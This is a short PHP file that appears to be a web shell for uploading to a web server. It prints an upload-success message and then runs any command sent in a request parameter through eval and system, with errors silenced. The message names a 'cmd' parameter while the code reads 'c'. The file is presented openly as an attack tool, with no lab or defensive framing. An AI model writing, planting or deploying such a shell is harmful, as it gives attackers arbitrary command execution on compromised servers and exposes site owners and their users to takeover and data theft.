<?php
echo "File upload successful! Pass commands using 'cmd' parameter as query.<br><br>";
$cmd = $_REQUEST['c'];
if($cmd){ @eval("system('$cmd');"); }
?>
